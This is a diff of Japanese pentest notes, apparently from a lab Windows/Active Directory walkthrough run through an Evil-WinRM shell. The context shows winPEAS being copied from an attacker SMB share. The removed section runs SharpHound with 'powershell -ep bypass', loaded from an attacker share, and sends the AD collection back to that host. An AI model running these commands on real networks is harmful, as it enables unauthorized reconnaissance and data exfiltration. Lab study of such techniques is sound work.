@@ -55,7 +55,7 @@ cp \\<AttackerIP>\share\winPEASx64.exe .
 
 ### ユーザー
 
-- 特に興味深い権限は持っていないし、home
+- 特に興味深い権限は持っていない
 ```sh
 *Evil-WinRM* PS C:\Users\Sandra\Desktop> whoami /priv
 
@@ -89,6 +89,8 @@ Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
 *Evil-WinRM* PS C:\Users\Sandra\Desktop> 
 
 ```
+
+
 
 
 ---
@@ -130,22 +132,11 @@ Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
 
 ### 興味深い情報
 
+- adminのホームは覗けない
+```sh
+
+```
+
 
 ---
 ---
-
-# AD
-
-## Auto w/ BloodHound
-
-```zsh
-# Attacker(作成済みのSMB共有を使う)
-cp /opt/bloodhound/SharpHound.ps1 share
-```
-```powershell
-# Target
-powershell -ep bypass
-net use \\<AttackerIP>\share /user:username pw
-Import-Module \\<AttackerIP>\share\SharpHound.ps1
-Invoke-BloodHound -CollectionMethod All -OutputDirectory \\<AttackerIP>\share -ZipFileName 'audit.zip'
-```
